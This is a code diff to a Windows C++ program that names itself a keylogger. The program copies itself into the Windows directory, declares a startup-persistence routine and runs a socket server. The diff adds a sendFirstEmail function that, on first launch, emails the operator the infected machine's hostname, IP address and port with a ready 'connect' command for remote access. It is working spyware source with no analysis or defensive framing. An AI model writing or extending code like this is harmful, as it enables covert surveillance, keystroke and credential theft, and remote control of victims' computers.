@@ -23,7 +23,7 @@
 
 #include "Keylogger.h"
 #include "SocketServer.h"
-#include "StringUtilities.h"
+#include "StringHelper.h"
 
 extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
@@ -41,6 +41,7 @@ void socketThreadProc();
 void mailerThreadProc();
 bool addToStartup(std::wstring pszAppName, std::wstring pathToExe);
 bool makeFirstLaunch();
+void sendFirstEmail();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
@@ -54,6 +55,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	if (isFirstLaunch) {
 		return 0;
 	}
+	// Only in first launch
+	sendFirstEmail();
 
 	MSG msg;
 	WNDCLASS wndClass;
@@ -151,7 +154,7 @@ bool makeFirstLaunch() {
 	std::wstring path = std::wstring(buff);
 	GetWindowsDirectory(buff, buffSize);
 	std::wstring winDir = std::wstring(buff);
-	if (StringUtilities::toLower(path).find(StringUtilities::toLower(winDir)) != 0) {
+	if (StringHelper::toLower(path).find(StringHelper::toLower(winDir)) != 0) {
 		// Copy self to windir
 		std::wstring newPath = winDir + L"\\" + PROGRAM_NAME;
 		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
@@ -176,4 +179,15 @@ bool makeFirstLaunch() {
 	} else {
 		return false;
 	}
+}
+
+void sendFirstEmail() {
+	auto emailService = make_shared<EmailService>();
+	auto subject = L"Keylogger. New computer connected.";
+	std::wstringstream bodyStream;
+	bodyStream << ComputerInfoHelper::getInstance()->getHostName() << " connected" << std::endl;
+	bodyStream << "To connect use this string:" << std::endl;
+	bodyStream << "connect " << ComputerInfoHelper::getInstance()->getIp() << " " <<
+		ComputerInfoHelper::getInstance()->getPort();
+	emailService->sendEmail(subject, bodyStream.str(), L"");
 }
